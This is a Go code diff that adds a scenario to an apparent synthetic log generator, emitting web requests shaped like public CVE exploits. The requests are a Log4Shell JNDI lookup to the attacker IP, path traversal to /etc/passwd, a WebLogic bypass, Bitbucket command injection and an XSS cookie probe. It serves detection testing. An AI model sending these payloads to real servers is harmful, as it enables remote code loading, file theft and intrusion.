@@ -313,6 +313,29 @@ func (g *Gen) scenarios() []scenario {
 			}
 			return out
 		}},
+		{"known exploit payloads (CVE probes)", func() []Line {
+			ip, now := g.attackerIP(), time.Now()
+			// Request shapes from public exploits; most only trip a
+			// detection when the server answered 200.
+			probes := []struct {
+				method, path, agent string
+				status              int
+			}{
+				{"GET", "/?x=${jndi:ldap://" + ip + ":1389/Exploit}", "${jndi:ldap://" + ip + ":1389/a}", 200},                               // Log4Shell
+				{"GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", "curl/8.4.0", 200},                                                        // Apache CVE-2021-41773
+				{"GET", "/public/plugins/loki/../../../../../../../../etc/passwd", "Mozilla/5.0", 200},                                       // Grafana CVE-2021-43798
+				{"GET", "/console/css/%2e%2e%2fconsole.portal", "Mozilla/5.0", 200},                                                          // WebLogic CVE-2020-14882
+				{"GET", "/rest/api/latest/projects/P/repos/r/archive?prefix=ax%00--exec=%60id%60%00--remote=x", "python-requests/2.32", 200}, // Bitbucket CVE-2022-36804
+				{"POST", "/SAAS/jersey/manager/api/migrate/tenant", "python-requests/2.32", 200},                                             // VMware CVE-2022-31659
+				{"GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "Mozilla/5.0", 200},                                     // XSS
+			}
+			g.rng.Shuffle(len(probes), func(i, j int) { probes[i], probes[j] = probes[j], probes[i] })
+			var out []Line
+			for _, p := range probes[:3+g.rng.IntN(len(probes)-2)] {
+				out = append(out, webLine(ip, p.method, p.path, p.status, 180, p.agent, now))
+			}
+			return out
+		}},
 		{"web login brute force", func() []Line {
 			ip, now := g.attackerIP(), time.Now()
 			var out []Line
